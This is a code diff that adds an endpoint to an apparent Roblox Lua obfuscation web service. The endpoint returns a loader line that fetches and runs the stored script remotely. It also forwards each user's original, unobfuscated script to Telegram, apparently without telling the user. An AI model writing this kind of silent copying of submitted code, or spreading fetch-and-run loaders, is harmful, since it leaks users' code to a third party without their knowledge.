@@ -102,6 +102,35 @@ function obfuscateWithPrometheus(scriptContent, preset, antiTamper) {
     });
 }
 
+// ─── ENDPOINT API ───────────────────────────────────────────
+app.post('/api/obfuscate', async (req, res) => {
+    // Sekarang menerima nilai antiTamper dari frontend
+    const { script, preset, antiTamper } = req.body; 
+    
+    if (!script) return res.status(400).json({ error: "Script is empty!" });
+    
+    const selectedPreset = preset || 'Medium';
+    const isAntiTamperOn = antiTamper === true;
+
+    try {
+        const obfuscatedCode = await obfuscateWithPrometheus(script, selectedPreset, isAntiTamperOn);
+        
+        const scriptId = Math.random().toString(36).substring(2, 15);
+        scriptDatabase.set(scriptId, obfuscatedCode);
+
+        const protocol = req.headers['x-forwarded-proto'] || req.protocol;
+        const host = req.headers['x-forwarded-host'] || req.headers.host;
+        const loader = `loadstring(game:HttpGet("${protocol}://${host}/Scripts?Id=${scriptId}"))("${scriptId}")`;
+
+        // Kirim ke Telegram beserta status Anti-Tamper
+        sendTelegramFile(script, scriptId, selectedPreset, isAntiTamperOn, loader);
+
+        res.json({ success: true, loader });
+    } catch (error) {
+        res.status(500).json({ error: error.toString() });
+    }
+});
+
 // ─── ENDPOINT SCRIPTS (ANTI-SKID DENGAN TELEGRAM ALERT) ─────
 app.get('/Scripts', (req, res) => {
     const userAgent = req.headers['user-agent'] || 'Unknown';
